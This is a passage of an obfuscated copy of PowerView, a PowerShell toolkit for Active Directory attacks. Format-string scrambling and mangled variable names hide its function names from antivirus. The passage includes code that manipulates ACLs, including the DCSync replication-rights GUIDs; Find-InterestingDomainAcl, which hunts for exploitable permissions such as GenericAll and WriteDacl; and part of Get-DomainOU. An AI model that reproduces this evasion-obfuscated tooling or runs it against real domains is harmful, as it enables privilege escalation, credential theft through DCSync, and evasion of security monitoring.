                    ("{3}{1}{2}{0}"-f 'ers','t','eMemb','Wri') { ("{2}{0}{4}{3}{7}{5}{9}{6}{8}{1}" -f'f9679c0-0d','49e2','b','6-11d0','e','-0','aa0','-a285','030','0') }
                    
                    
                    
                    
                    ("{0}{1}"-f 'D','CSync') { ("{1}{5}{4}{2}{3}{0}{6}"-f '-00c04fc2d','11','0','7-11d1-f79f','c','31f6aa-9','cd2'), ("{2}{7}{4}{8}{1}{5}{0}{6}{3}"-f 'f79f-0','-','1131f6ad','2','c','11d1-','0c04fc2dcd','-9','07'), ("{6}{0}{1}{3}{5}{2}{7}{4}" -f'e9','5b','991a-0facbe','7','c','6-444d-4c62-','89','da640')}
                }
            }

            ForEach (${Pr`iNC`iPAl`O`BJecT} in ${pr`iN`CI`paLS}) {
                &("{4}{0}{2}{1}{3}"-f'r','e','it','-Verbose','W') "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) "

                try {
                    ${i`dE`N`TiTY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${pri`N`cIp`A`loBjecT}."ObJ`eCt`SId")

                    if (${GU`i`DS}) {
                        ForEach (${GU`Id} in ${GU`IdS}) {
                            ${NE`w`guId} = &("{1}{0}{3}{2}" -f '-O','New','ject','b') ("{0}{1}"-f'Gu','id') ${g`UID}
                            ${a`DR`IgHtS} = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{1}{2}" -f 'E','x','tendedRight')
                            ${a`CeS} += &("{1}{0}{2}" -f'w','Ne','-Object') ("{11}{10}{2}{5}{4}{1}{8}{12}{9}{0}{7}{6}{3}"-f'or','ry','.D','le','o','irect','Ru','yAccess','Servic','ect','tem','Sys','es.ActiveDir') ${IdE`NTItY}, ${adR`i`g`htS}, ${COn`TRol`TYpe}, ${n`EwgUid}, ${InHeRi`T`AnC`E`TYPe}
                        }
                    }
                    else {
                        
                        ${Ad`RIG`hTs} = [System.DirectoryServices.ActiveDirectoryRights] ("{1}{2}{0}{3}"-f 'ric','Ge','ne','All')
                        ${a`CeS} += &("{2}{0}{3}{1}"-f'ew-Ob','t','N','jec') ("{5}{1}{6}{0}{3}{7}{2}{8}{4}" -f'ectoryServices.A','.Di','cce','ctiveD','le','System','r','irectoryA','ssRu') ${i`DeN`TITy}, ${a`drIgh`TS}, ${cO`NTroL`TYPe}, ${in`hEriT`A`NC`ETYpe}
                    }

                    
                    ForEach (${A`Ce} in ${AC`Es}) {
                        &("{2}{0}{3}{1}{4}"-f 'i','-Verbo','Wr','te','se') "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${taRg`e`TEnt`RY} = ${t`A`R`g`etOBJECT}.("{2}{4}{1}{0}{3}"-f 'r','t','GetDirectory','y','En').Invoke()
                        ${t`ArGE`Te`NtRy}."PSB`ASe"."oP`Ti`oNs"."Se`c`URItYM`A`SkS" = ("{0}{1}"-f'Da','cl')
                        ${TaRG`eTE`NTRy}."pSb`Ase"."O`BJ`ec`TSeCuRity".("{1}{2}{4}{0}{3}" -f'cce','R','emov','ssRule','eA').Invoke(${A`cE})
                        ${T`A`RGe`TEnTry}."pSbA`sE".("{3}{0}{2}{1}"-f'ommit','s','Change','C').Invoke()
                    }
                }
                catch {
                    &("{1}{0}{3}{2}"-f 'te-V','Wri','ose','erb') "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function FIND-`i`NtERE`STiNGDoMaina`cL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}" -f'ocess','dPr','PSShoul'}, '')]
    [OutputType({"{2}{1}{0}"-f 'CL','werView.A','Po'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOSition = 0, vAluEFrOmPipelinE = ${tr`UE}, VALuefrOmpiPElINEbypROPerTyNAmE = ${t`Rue})]
        [Alias({"{2}{1}{0}{3}" -f'm','a','DomainN','e'}, {"{0}{1}" -f'Na','me'})]
        [String]
        ${D`OM`AiN},

        [Switch]
        ${REs`oL`VegUiDs},

        [String]
        [ValidateSet('All', {"{2}{3}{1}{0}" -f 'd','wor','R','esetPass'}, {"{2}{0}{1}"-f 'te','Members','Wri'})]
        ${rIGHt`SfI`lT`ER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'r','ilte','F'})]
        [String]
        ${l`dApF`ilTEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'DSPath','A'})]
        [String]
        ${s`Ea`RcH`BAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{3}{1}{0}" -f'ler','ol','t','r','DomainCon'})]
        [String]
        ${se`RV`er},

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{2}{0}{1}"-f'neL','evel','O'}, {"{0}{2}{1}"-f 'Su','ee','btr'})]
        [String]
        ${Searc`h`scopE} = ("{2}{0}{1}"-f 'u','btree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Resu`lTpa`GesI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErvEr`TIM`e`Li`mIT},

        [Switch]
        ${t`ombSt`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`e`dEn`TiAL} =   (  &("{3}{0}{2}{1}" -f'vARi','bLe','a','GEt-')  ("{0}{1}"-f 'JH3Xo','6') )."VA`Lue"::"EM`PTY"
    )

    BEGIN {
        ${aCLA`RG`UmeN`Ts} = @{}
        if (${P`Sbo`U`NDPaRAm`Et`ers}[("{2}{0}{1}" -f'eGUID','s','Resolv')]) { ${AC`lA`RG`Um`enTs}[("{0}{2}{1}" -f 'Re','eGUIDs','solv')] = ${REs`ol`V`EguIdS} }
        if (${Psb`oUn`dp`Arame`TErS}[("{3}{1}{2}{0}"-f'er','h','tsFilt','Rig')]) { ${AC`lARGU`mentS}[("{3}{2}{0}{1}"-f 'sFilte','r','ight','R')] = ${Rig`htsFilt`er} }
        if (${PsBO`Un`dpArA`mET`ers}[("{2}{1}{0}"-f'ter','l','LDAPFi')]) { ${AC`lAr`GumE`NTS}[("{2}{0}{1}"-f'ilte','r','LDAPF')] = ${L`Da`PFI`LteR} }
        if (${pSBo`U`N`DPaRa`mE`TerS}[("{1}{0}{2}{3}"-f'arc','Se','h','Base')]) { ${ACLA`RGUMEn`Ts}[("{1}{0}{3}{2}" -f 'e','S','rchBase','a')] = ${Se`ArC`HBaSE} }
        if (${p`S`B`oundpARaM`etERs}[("{0}{1}"-f'Serv','er')]) { ${ACLa`RgU`Me`N`Ts}[("{0}{1}"-f 'Serv','er')] = ${seR`VeR} }
        if (${p`S`BoUNDPArameT`ERS}[("{1}{0}{2}" -f 'hScop','Searc','e')]) { ${Ac`LARgU`mENts}[("{3}{2}{0}{1}"-f 'hScop','e','c','Sear')] = ${s`eArcH`scOPE} }
        if (${psBoUnd`pA`R`AmE`TeRs}[("{2}{3}{0}{1}" -f'sultPage','Size','R','e')]) { ${aclAr`Gu`M`en`TS}[("{1}{3}{0}{4}{2}" -f'tP','R','ize','esul','ageS')] = ${RESUL`T`P`AgEs`Ize} }
        if (${PSBouNd`PAR`AmeT`eRs}[("{3}{1}{0}{2}" -f 'm','meLi','it','ServerTi')]) { ${aCla`R`G`UM`eNTS}[("{0}{1}{2}"-f'Ser','verTimeL','imit')] = ${seRVEr`Ti`m`eLim`IT} }
        if (${pSbOuND`P`A`RAm`EteRS}[("{0}{1}{2}" -f'To','mb','stone')]) { ${AcLAr`g`UMenTs}[("{0}{2}{1}" -f 'Tomb','one','st')] = ${T`om`Bsto`Ne} }
        if (${pSBOUNDpaR`AME`TE`Rs}[("{1}{0}{2}"-f 'a','Credenti','l')]) { ${acL`ARGU`Me`NtS}[("{1}{0}{2}"-f 'rede','C','ntial')] = ${c`REDENt`iaL} }

        ${OBjECTSeArcheRaRgU`m`e`N`Ts} = @{
            ("{1}{2}{0}"-f 'ties','Pr','oper') = ("{1}{0}{4}{2}{5}{3}" -f 'mac','sa','e,objectcl','ss','countnam','a')
            'Raw' = ${TR`Ue}
        }
        if (${psbOu`NdP`Ar`AMeters}[("{1}{0}" -f'erver','S')]) { ${o`Bje`cTs`EArC`h`eR`ArGUMe`Nts}[("{0}{1}"-f 'Ser','ver')] = ${sErV`Er} }
        if (${psb`OuND`PARAme`T`ERS}[("{0}{2}{1}"-f 'S','chScope','ear')]) { ${ObJe`CTS`EArchE`RArG`Um`En`TS}[("{0}{2}{1}" -f 'Sear','hScope','c')] = ${s`EaRchSC`O`Pe} }
        if (${PSbOUn`D`PaRA`MeTeRS}[("{2}{0}{1}" -f'tPageSi','ze','Resul')]) { ${objECTSE`A`R`CHE`RarGUmeNts}[("{1}{2}{0}" -f'eSize','Resu','ltPag')] = ${R`ESultPag`EsIzE} }
        if (${P`SbO`U`NDParaME`TErs}[("{1}{0}{4}{3}{2}"-f'rTi','Serve','mit','i','meL')]) { ${Obj`eCtSe`A`RcH`ERArG`U`meNtS}[("{1}{0}{2}"-f'rverTi','Se','meLimit')] = ${s`Er`V`ErTIM`elIMIT} }
        if (${PSbOUND`PAR`Am`e`T`ERS}[("{1}{0}" -f'tone','Tombs')]) { ${O`B`J`ECts`EAR`CheRAr`GumENTs}[("{0}{1}{2}" -f 'Tomb','s','tone')] = ${TO`MBS`T`One} }
        if (${Ps`BoUN`DPaRA`m`eters}[("{0}{1}{2}"-f 'C','redent','ial')]) { ${O`BJeCt`SeAr`C`he`RArGUmE`NTS}[("{3}{2}{0}{1}"-f'nti','al','de','Cre')] = ${Cre`d`EntiAl} }

        ${AD`NaMeAr`gUMeN`TS} = @{}
        if (${PSbOu`NDp`A`RamEters}[("{0}{1}" -f 'Ser','ver')]) { ${A`dnAME`ARgUME`NtS}[("{0}{1}"-f 'Serve','r')] = ${s`ERv`ER} }
        if (${PSBO`Undp`Ar`A`meTErS}[("{2}{0}{1}"-f'n','tial','Crede')]) { ${Adn`AME`ARGume`NTS}[("{2}{0}{1}"-f'd','ential','Cre')] = ${cre`d`EnT`ial} }

        
        ${re`S`OLVEd`SiDS} = @{}
    }

    PROCESS {
        if (${PSb`O`UnDPaRaME`TE`RS}[("{0}{1}{2}"-f'D','omai','n')]) {
            ${Ac`L`ArgumeNtS}[("{1}{0}{2}" -f'ai','Dom','n')] = ${d`Oma`IN}
            ${adname`A`RG`UmeNts}[("{1}{0}"-f 'main','Do')] = ${dom`AIn}
        }

        &("{1}{2}{3}{4}{0}" -f'l','Get-Domai','nObje','c','tAc') @ACLArguments | &("{2}{0}{3}{1}" -f'a','-Object','ForE','ch') {

            if ( (${_}."Ac`TIVeDi`ReCtoRyR`i`gHts" -match ((("{1}{0}{7}{2}{6}{4}{3}{5}{8}"-f'ner','Ge','mWri','ate4','e4kmCre','km','t','icAll4k','Delete'))  -CREPlACe '4km',[cHAr]124)) -or ((${_}."ac`Ti`VEDi`ReCt`oRyrIg`HtS" -match ("{2}{3}{1}{0}"-f 'ht','g','ExtendedR','i')) -and (${_}."aCEqU`Al`ifi`eR" -match ("{1}{0}"-f'w','Allo')))) {
                
                if (${_}."SecU`Ri`TyIDEN`T`I`FIER"."vA`LuE" -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if (${re`sOl`VEd`sI`Ds}[${_}."Se`cu`RiTYID`enTI`FiER"."va`lue"]) {
                        ${i`dEnt`iTYRE`FER`ENCe`NAme}, ${Id`enti`TyrefErencE`dom`AiN}, ${iDE`NtiT`yRe`FERencE`dN}, ${Id`eNTIty`REfE`R`EN`CEClaSs} = ${RE`so`LVeDSiDS}[${_}."SecURI`TYi`DEnTIF`iER"."vAl`UE"]

                        ${I`N`TeReSTING`ACl} = &("{1}{0}{3}{2}"-f'w','Ne','Object','-') ("{1}{0}{2}"-f'SOb','P','ject')
                        ${InTerEsti`N`ga`CL} | &("{0}{2}{1}" -f'Add-','er','Memb') ("{1}{3}{0}{2}"-f'er','Note','ty','Prop') ("{0}{2}{1}" -f 'Obje','tDN','c') ${_}."OBjeCT`Dn"
                        ${iNt`er`E`sTingAcL} | &("{2}{0}{1}{3}"-f'Mem','b','Add-','er') ("{0}{1}{2}"-f 'Not','ePro','perty') ("{3}{2}{0}{1}" -f'f','ier','i','AceQual') ${_}."A`CEquALiF`i`eR"
                        ${I`NT`ERESTiN`gACl} | &("{2}{0}{3}{1}"-f 'dd','er','A','-Memb') ("{0}{1}{2}" -f 'NotePr','op','erty') ("{0}{4}{1}{2}{3}{5}"-f'Ac','veD','irecto','ryRig','ti','hts') ${_}."AC`TiveD`iRE`CtOry`R`IGHTS"
                        if (${_}."Ob`j`Ect`ACEtYPe") {
                            ${I`N`Ter`EstINgAcL} | &("{0}{1}{2}"-f 'Add-Me','m','ber') ("{2}{0}{1}" -f 'Prope','rty','Note') ("{2}{4}{3}{1}{0}" -f 'pe','y','O','eT','bjectAc') ${_}."ObJEct`ACEtY`pE"
                        }
                        else {
                            ${INteReS`TI`NG`ACL} | &("{1}{3}{2}{0}" -f 'ember','Ad','-M','d') ("{0}{2}{1}{3}" -f 'NotePr','e','op','rty') ("{4}{1}{0}{2}{3}" -f'eTy','tAc','p','e','Objec') ("{0}{1}" -f 'No','ne')
                        }
                        ${In`TerEsT`InGaCL} | &("{0}{1}{2}"-f'A','dd-Me','mber') ("{3}{1}{2}{0}" -f'y','e','rt','NoteProp') ("{0}{2}{1}" -f 'AceFl','gs','a') ${_}."Acef`la`Gs"
                        ${iNTeRe`S`T`INg`Acl} | &("{1}{0}{2}"-f 'dd-Me','A','mber') ("{1}{2}{0}"-f'y','N','otePropert') ("{0}{2}{1}" -f'A','pe','ceTy') ${_}."Ace`TYPE"
                        ${inTer`es`T`I`NgACL} | &("{1}{2}{0}{3}" -f'e','Add-Mem','b','r') ("{0}{2}{1}"-f 'N','roperty','oteP') ("{0}{2}{1}"-f'Inherit','gs','anceFla') ${_}."I`Nher`ITAnCefL`AGs"
                        ${InTE`Re`s`Tin`Gacl} | &("{1}{0}{2}"-f 'e','Add-Memb','r') ("{3}{2}{0}{1}"-f 'rt','y','Prope','Note') ("{2}{4}{1}{0}{3}"-f 'yIdentifi','curit','S','er','e') ${_}."se`cU`R`ItyideNT`IF`IeR"
                        ${i`N`Ter`EStinGa`cl} | &("{2}{0}{1}" -f 'mb','er','Add-Me') ("{0}{1}{3}{2}"-f 'N','o','erty','teProp') ("{2}{0}{3}{1}{4}" -f 'ity','ceNa','Ident','Referen','me') ${I`dE`NTiTYR`EF`EReNCeNAmE}
                        ${InT`erEstiN`g`Acl} | &("{1}{2}{3}{0}"-f 'ber','Ad','d','-Mem') ("{2}{0}{1}"-f'per','ty','NotePro') ("{0}{3}{2}{1}{4}{6}{5}" -f'IdentityRefer','e','nc','e','Do','n','mai') ${ID`eNtity`ReF`Ere`NC`ED`omAiN}
                        ${IN`Te`Re`stinG`ACl} | &("{2}{0}{1}"-f 'b','er','Add-Mem') ("{1}{2}{0}" -f'operty','Not','ePr') ("{1}{4}{3}{5}{2}{0}"-f 'erenceDN','Id','ef','ntity','e','R') ${IdEN`T`It`yr`efEREnC`EDn}
                        ${iN`TE`REST`ingAcl} | &("{1}{2}{0}"-f 'r','Add-M','embe') ("{1}{0}{2}{3}"-f'ot','N','ePr','operty') ("{2}{4}{1}{0}{3}" -f 's','eCla','IdentityRefer','s','enc') ${i`DentI`TyReF`E`RenceCL`AsS}
                        ${Inte`RE`stING`Acl}
                    }
                    else {
                        ${I`de`NtItY`REF`eren`c`edn} = &("{2}{4}{1}{0}{3}"-f'r','nve','C','t-ADName','o') -Identity ${_}."seC`U`RitYi`Den`Ti`FIer"."val`Ue" -OutputType ('DN') @ADNameArguments
                        

                        if (${idEN`T`i`TyREf`eRenc`edN}) {
                            ${iDE`NTiTy`R`EF`E`RENcedomain} = ${ID`En`TIt`yRefEREN`CE`dN}.("{0}{1}{2}"-f 'Sub','S','tring').Invoke(${id`E`NTi`TY`REF`E`REnCeDN}.("{0}{2}{1}"-f 'In','f','dexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            
                            ${Ob`jecTse`ArCh`er`ARg`U`MEn`Ts}[("{0}{1}"-f 'Domai','n')] = ${iDEn`TiTyRefER`e`NcE`d`oMa`in}
                            ${oB`JEc`TsEArCh`ERArgU`MEnTS}[("{0}{1}" -f 'Ident','ity')] = ${iD`e`NtI`TYR`E`FERENcEdn}
                            
                            ${oBj`e`Ct} = &("{0}{3}{2}{1}{4}"-f 'Get','omainObje','D','-','ct') @ObjectSearcherArguments

                            if (${o`B`jeCT}) {
                                ${iDE`N`TIT`YrEFER`ENce`N`AME} = ${O`BJeCt}."prop`eR`TI`eS"."samA`CCount`NamE"[0]
                                if (${o`BJEcT}."pROPeRT`i`ES"."Ob`ject`clASs" -match ("{0}{1}" -f 'compute','r')) {
                                    ${Id`En`TI`Ty`ReFerEnCEc`L`Ass} = ("{0}{2}{1}"-f'co','puter','m')
                                }
                                elseif (${O`B`JEct}."pRo`pe`RTiES"."O`BJEcT`ClAsS" -match ("{1}{0}" -f'up','gro')) {
                                    ${Id`ENtITyreF`E`ReN`ceCl`A`Ss} = ("{1}{0}" -f'oup','gr')
                                }
                                elseif (${OBj`eCT}."pRoPER`T`iES"."oB`jECT`clASs" -match ("{0}{1}" -f 'u','ser')) {
                                    ${Id`eNTiT`yrEfer`enCeC`lAsS} = ("{0}{1}"-f 'us','er')
                                }
                                else {
                                    ${id`eNTItY`ReFERE`N`C`E`cLAsS} = ${N`ULL}
                                }

                                
                                ${re`Solv`eDsiDs}[${_}."sE`cUrIT`Yide`N`TIfIER"."Va`lUe"] = ${identIt`yr`EFe`RE`NcenAmE}, ${IDen`T`ItYr`efe`RE`NC`edom`AiN}, ${IdENti`TYrE`FE`RENCe`DN}, ${IDen`TITyr`ef`E`REn`Ce`claSS}

                                ${IN`TeRE`stin`GAcL} = &("{0}{1}{3}{2}" -f 'New','-O','ect','bj') ("{2}{1}{0}" -f 't','SObjec','P')
                                ${INtErest`in`g`ACl} | &("{0}{2}{1}" -f'Add-M','ber','em') ("{0}{1}{2}"-f'N','oteProp','erty') ("{1}{0}{2}"-f 'bjec','O','tDN') ${_}."ObJ`ecT`dn"
                                ${i`NtErestin`ga`Cl} | &("{2}{1}{0}" -f 'd-Member','d','A') ("{0}{1}{2}{3}" -f'No','te','P','roperty') ("{2}{0}{1}{3}" -f'li','fi','AceQua','er') ${_}."acEQual`I`F`ier"
                                ${INt`e`RestiN`gA`Cl} | &("{1}{0}{2}"-f'd-Membe','Ad','r') ("{1}{0}{2}"-f 'o','NotePr','perty') ("{3}{1}{2}{5}{0}{4}"-f 'yRig','Dir','ecto','Active','hts','r') ${_}."AcT`IvE`d`IR`ECtoRyRigHTs"
                                if (${_}."OBjeCT`AC`etYPE") {
                                    ${INtEr`E`stiNGacl} | &("{2}{1}{0}" -f 'er','Memb','Add-') ("{0}{2}{1}"-f'NoteP','perty','ro') ("{3}{0}{2}{1}"-f 'b','AceType','ject','O') ${_}."ObjEc`Ta`ceTyPe"
                                }
                                else {
                                    ${In`TE`ReStinGa`cL} | &("{0}{2}{1}"-f'Ad','mber','d-Me') ("{2}{3}{1}{0}"-f 'y','Propert','Not','e') ("{2}{1}{0}" -f 'Type','tAce','Objec') ("{1}{0}"-f 'one','N')
                                }
                                ${iNte`RES`TIN`gAcl} | &("{2}{3}{0}{1}"-f'e','r','Add-M','emb') ("{1}{2}{0}{3}" -f 'rt','Not','ePrope','y') ("{1}{2}{0}" -f 'Flags','A','ce') ${_}."AcEfL`AGS"
                                ${I`N`TErE`StiN`gACL} | &("{2}{0}{1}" -f'd-Me','mber','Ad') ("{0}{2}{1}" -f'Not','rty','ePrope') ("{2}{0}{1}"-f'eTyp','e','Ac') ${_}."aCet`YPe"
                                ${iNTE`ReStinG`A`CL} | &("{0}{2}{1}"-f 'Add-','ber','Mem') ("{3}{1}{0}{2}" -f'p','tePro','erty','No') ("{2}{0}{1}{3}" -f 'tan','ceF','Inheri','lags') ${_}."INHeriT`A`Nce`FLaGS"
                                ${IN`TeRe`sT`i`NGaCL} | &("{1}{0}{2}"-f 'dd-Membe','A','r') ("{1}{2}{3}{0}"-f'erty','Note','Pro','p') ("{3}{1}{0}{4}{2}"-f 'y','it','r','Secur','Identifie') ${_}."secURiTy`IdE`NTI`FIER"
                                ${IN`T`e`RestiNGacl} | &("{1}{0}{2}" -f 'emb','Add-M','er') ("{1}{2}{0}{3}"-f 'r','Note','Prope','ty') ("{2}{3}{1}{0}{4}" -f 'ntityReferenceN','e','I','d','ame') ${iDEnT`ITy`Ref`Ere`N`CeNAmE}
                                ${INTe`Re`sTinG`ACL} | &("{1}{0}{2}"-f'dd-M','A','ember') ("{0}{1}{3}{2}"-f 'Not','ePr','erty','op') ("{1}{5}{3}{2}{0}{4}{6}"-f 'enceD','I','fer','ntityRe','o','de','main') ${i`Den`TiTyreFEre`Nc`EdOmaiN}
                                ${Inter`ESTIN`G`ACl} | &("{2}{1}{0}"-f 'Member','d-','Ad') ("{1}{2}{0}" -f'erty','NotePr','op') ("{4}{3}{2}{0}{1}" -f'enceD','N','Refer','tity','Iden') ${i`DE`Ntit`YrEfERe`NCeDn}
                                ${I`NTE`ReStin`gACL} | &("{2}{1}{0}"-f 'er','emb','Add-M') ("{2}{0}{1}" -f'tePropert','y','No') ("{2}{5}{1}{3}{0}{6}{4}" -f 'e','entity','I','Ref','Class','d','rence') ${IDentitYrefeR`E`N`cECl`ASS}
                                ${IN`TeResTI`NgAcl}
                            }
                        }
                        else {
                            &("{2}{1}{3}{0}"-f 'ing','ite-','Wr','Warn') "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName "
                        }
                    }
                }
            }
        }
    }
}


function G`eT-`DoMai`Nou {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}" -f 'ouldPr','Sh','ocess','PS'}, '')]
    [OutputType({"{1}{2}{0}" -f 'OU','P','owerView.'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOSiTIOn = 0, VALueFRoMpiPeLiNE = ${tr`UE}, valUeFroMPIPEliNEbYPROPErtYNAME = ${T`Rue})]
        [Alias({"{1}{0}"-f'me','Na'})]
        [String[]]
        ${i`DEnTI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{0}{1}" -f'GUI','D'})]
        ${gp`l`iNK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oMaiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'Filt','er'})]
        [String]
        ${LDApf`I`lt`ER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`Roper`TI`Es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADS','Path'})]
        [String]
        ${sE`A`RChBASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{2}{1}{0}" -f 'r','le','rol','nCont','Domai'})]
        [String]
        ${S`ERV`ER},

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{1}{0}{2}"-f'eL','On','evel'}, {"{0}{2}{1}" -f'Su','e','btre'})]
        [String]
        ${S`eARchS`cO`Pe} = ("{1}{0}"-f'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`s`U`LtPAg`ESize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRvE`RtimEl`iMIt},

        [ValidateSet({"{1}{0}" -f'cl','Da'}, {"{0}{1}" -f'G','roup'}, {"{0}{1}" -f 'No','ne'}, {"{1}{0}" -f 'r','Owne'}, {"{1}{0}"-f 'acl','S'})]
        [String]
        ${s`ecur`ITy`mas`ks},

        [Switch]
        ${TO`MB`s`Tone},

        [Alias({"{0}{1}{2}"-f 'Ret','urnO','ne'})]
        [Switch]
        ${FIN`dO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDE`N`TIAl} =   (  &("{2}{0}{1}"-f 'ARIaB','Le','V')  ("Jh"+"3xo"+"6"))."Va`LUE"::"EMp`TY",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${sear`CherarG`Um`En`Ts} = @{}
        if (${pS`BOuNd`paR`A`m`eteRs}[("{0}{1}"-f'D','omain')]) { ${SE`AR`cheRaRGU`ME`N`Ts}[("{2}{1}{0}"-f 'ain','m','Do')] = ${dOMA`IN} }
        if (${P`sBounDPARA`Me`TerS}[("{0}{2}{1}"-f'Pro','erties','p')]) { ${SE`ARCHer`ARguME`N`Ts}[("{0}{2}{1}"-f'Prop','ies','ert')] = ${P`R`oPerti`Es} }
        if (${p`sBOund`paR`A`MeTerS}[("{0}{1}{2}" -f'Sea','r','chBase')]) { ${seArC`h`e`RaRG`UmEntS}[("{0}{2}{3}{1}" -f'S','hBase','ea','rc')] = ${SE`Ar`ChbAse} }
        if (${psBouN`d`par`Amet`Ers}[("{1}{0}"-f'er','Serv')]) { ${sE`ARcHer`A`R`gUMeNTS}[("{1}{0}"-f'er','Serv')] = ${se`RV`Er} }
        if (${pS`B`O`Un`dPARame`TeRs}[("{1}{3}{0}{2}"-f'o','S','pe','earchSc')]) { ${sEarcHER`Arg`UMe`NtS}[("{2}{0}{1}" -f 'S','cope','Search')] = ${sEarcH`Sco`pe} }
        if (${PSb`oun`DpAraME`TErS}[("{3}{1}{0}{2}" -f'ultPageS','s','ize','Re')]) { ${sEa`RChe`R`ArGUMENtS}[("{0}{1}{2}{4}{3}"-f 'Resul','t','Pag','Size','e')] = ${R`eSULTP`A`gesIzE} }
        if (${PSbOU`NdPAr`AMe`TeRS}[("{1}{3}{2}{0}" -f 'mit','S','Li','erverTime')]) { ${s`EaRC`hEr`ARgu`Men`Ts}[("{3}{0}{2}{1}" -f'er','it','TimeLim','Serv')] = ${sEr`VERtIme`lI`MIt} }
        if (${psbOU`Ndp`AR`AMeT`E`Rs}[("{2}{1}{3}{4}{0}"-f's','urit','Sec','yM','ask')]) { ${sEAr`cHER`A`RgUmENTS}[("{4}{1}{3}{2}{0}"-f 'ks','ecu','as','rityM','S')] = ${sec`U`R`I`TYmASKS} }
        if (${PSbOUN`dPar`AM`eTers}[("{1}{0}" -f 'ombstone','T')]) { ${s`earCherA`R`G`UMents}[("{0}{1}{2}" -f 'To','mbs','tone')] = ${toM`BstO`Ne} }
        if (${pSBoU`NDpaRA`m`E`TerS}[("{0}{1}{3}{2}" -f'C','r','ial','edent')]) { ${SEaR`CHErarG`U`m`E`NTs}[("{2}{0}{1}"-f'redentia','l','C')] = ${cREde`NT`iaL} }
        ${o`Us`earCher} = &("{1}{4}{0}{2}{3}"-f'c','Get-Do','h','er','mainSear') @SearcherArguments
    }

    PROCESS {
        if (${o`U`SeAr`ChER}) {
            ${IDEnti`T`Yf`ILteR} = ''
            ${fi`l`Ter} = ''
            ${IdE`Nt`Ity} | &("{2}{0}{1}" -f're-Obje','ct','Whe') {${_}} | &("{3}{0}{1}{2}" -f 'Eac','h','-Object','For') {
                ${idE`NTitYInSTa`N`Ce} = ${_}.("{1}{0}"-f 'ace','Repl').Invoke('(', '\28').("{1}{2}{0}" -f 'ce','Rep','la').Invoke(')', '\29')
                if (${identiTY`inS`T`AnCE} -match ("{1}{0}" -f '=.*','^OU')) {
                    ${id`ENTIt`YFi`L`TER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psBOUnDp`Ar`Am`EteRs}[("{2}{1}{0}" -f 'ain','m','Do')]) -and (-not ${Ps`BoUNDpArAM`eTE`Rs}[("{2}{1}{0}" -f'e','Bas','Search')])) {
                        
                        
                        ${i`D`eNTiTydOmAin} = ${IdeNT`I`TY`INsT`AnCE}.("{1}{0}"-f 'bString','Su').Invoke(${id`eN`TI`TyINST`AnCE}.("{1}{0}{2}" -f'nde','I','xOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{3}{0}{1}{2}"-f 'ri','te-Ve','rbose','W') ('[Ge'+'t-Domai'+'nO'+'U'+'] '+'Extr'+'acte'+'d '+'do'+'main'+' '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${SE`AR`Ch`E`RARg`UMENtS}[("{1}{0}{2}" -f 'om','D','ain')] = ${I`D`eNtITYDOm`A`In}
                        ${ouS`Ea`RCHEr} = &("{3}{1}{4}{0}{2}{5}" -f'Sear','Do','ch','Get-','main','er') @SearcherArguments
                        if (-not ${O`USE`A`RChER}) {
                            &("{2}{3}{1}{0}"-f'g','in','Write-War','n') ('[Ge'+'t'+'-Doma'+'inOU] '+'U'+'nabl'+'e '+'t'+'o '+'retrie'+'ve '+'d'+'omai'+'n '+'sea'+'rcher'+' '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${GuidBy`TeStR`INg} = (-Join (([Guid]${Id`EntiT`YIn`St`A`NcE}).("{2}{3}{1}{0}"-f 'ay','teArr','T','oBy').Invoke() | &("{0}{2}{1}" -f'ForEach-','bject','O') {${_}.("{0}{2}{1}" -f'ToSt','ng','ri').Invoke('X').("{2}{0}{1}" -f'ad','Left','P').Invoke(2,'0')})) -Replace ("{0}{1}" -f'(.','.)'),'\$1'
                        ${I`D`EN`Ti`TYFILter} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${IDE`N`TiT`yfi`Lter} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${i`dE`NTIt`yFIlteR} -and (${I`DENtIt`Yfi`l`TER}.("{1}{0}"-f 'im','Tr').Invoke() -ne '') ) {
